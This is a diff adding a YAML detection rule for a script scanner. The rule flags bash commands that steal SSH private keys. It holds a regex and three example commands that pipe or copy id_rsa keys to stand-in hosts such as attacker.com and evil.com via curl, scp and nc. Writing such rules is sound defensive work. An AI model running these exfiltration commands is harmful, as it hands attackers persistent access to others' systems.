@@ -1,0 +1,35 @@
+# Bash Pattern: SSH Key Theft
+# Detects attempts to steal SSH private keys
+
+id: BASH-005
+name: SSH Private Key Theft
+description: |
+  Detects attempts to access, copy, or exfiltrate SSH private keys. Attackers
+  target SSH keys to gain persistent access to systems and move laterally across
+  networks. This pattern identifies access to .ssh directories, id_rsa files,
+  and other SSH credential locations.
+languages:
+  - bash
+detection_type: regex
+detection_logic: '(?:cat|cp|scp|curl.*-d|base64).*(?:\.ssh/id_rsa|\.ssh/id_dsa|\.ssh/id_ecdsa|\.ssh/id_ed25519|/root/\.ssh/|/home/[^/]+/\.ssh/)'
+severity: High
+mitre_technique: T1552.004
+confidence: 0.9
+category: credential_access
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-17"
+  updated: "2025-11-17"
+  references:
+    - "https://attack.mitre.org/techniques/T1552/004/"
+    - "https://www.ssh.com/academy/ssh/key"
+  tags:
+    - bash
+    - ssh
+    - credential-theft
+    - lateral-movement
+  examples:
+    - "cat ~/.ssh/id_rsa | curl -X POST http://attacker.com/collect"
+    - "cp /root/.ssh/id_rsa /tmp/key && scp /tmp/key user@evil.com:/data/"
+    - "base64 ~/.ssh/id_rsa | nc attacker.com 4444"
